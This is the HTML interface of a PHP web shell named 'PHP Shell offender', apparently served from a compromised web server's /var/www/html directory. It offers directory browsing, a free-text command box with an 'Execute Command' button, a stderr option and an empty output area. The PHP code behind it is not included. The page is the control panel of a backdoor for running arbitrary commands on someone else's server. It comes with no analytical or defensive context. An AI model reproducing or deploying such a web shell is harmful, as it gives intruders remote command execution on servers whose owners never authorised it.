 
<html> 
<head> 
<title>PHP Shell offender</title> 
<meta http-equiv="Content-Type" content="text/html; charset=windows-1250"></head> 
<body> 
<h1>PHP Shell offender</h1> 
 
<form name="myform" action="" method="post"> 
<p>Current working directory: <b> 
<a href="?work_dir=/">Root</a>/<a href="?work_dir=%2Fvar">var</a>/<a href="?work_dir=%2Fvar%2Fwww">www</a>/<a href="?work_dir=%2Fvar%2Fwww%2Fhtml">html</a>/</b></p> 
<p>Choose new working directory: 
<select name="work_dir" onfiltered="this.form.submit()"> 
<option value="/var/www/html" selected>Current Directory</option>
<option value="/var/www">Parent Directory</option>
 
</select></p> 
<p>Command: <input type="text" name="command" size="60"> 
<input name="submit_btn" type="submit" value="Execute Command"></p> 
<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"></p> 
<textarea cols="80" rows="20" readonly> 
 
